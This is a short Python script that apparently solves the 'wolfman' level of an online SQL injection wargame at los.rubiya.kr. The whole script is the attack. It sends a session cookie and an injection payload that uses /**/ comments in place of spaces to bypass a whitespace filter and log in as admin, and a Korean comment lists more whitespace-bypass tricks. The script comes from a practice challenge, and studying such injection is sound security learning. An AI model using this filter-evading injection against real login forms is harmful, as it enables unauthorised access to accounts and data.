import requests

url = "http://los.rubiya.kr/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

params = {
    # 공백우회는  %0a, %0b, %0c, %0d, (), /**/ 등이 있다.
    "pw":"'/**/or/**/id='admin'#"
    #"pw":"'/**/or/**/id='admin"
}

res = requests.get(url, params=params, headers=headers)
print res.content

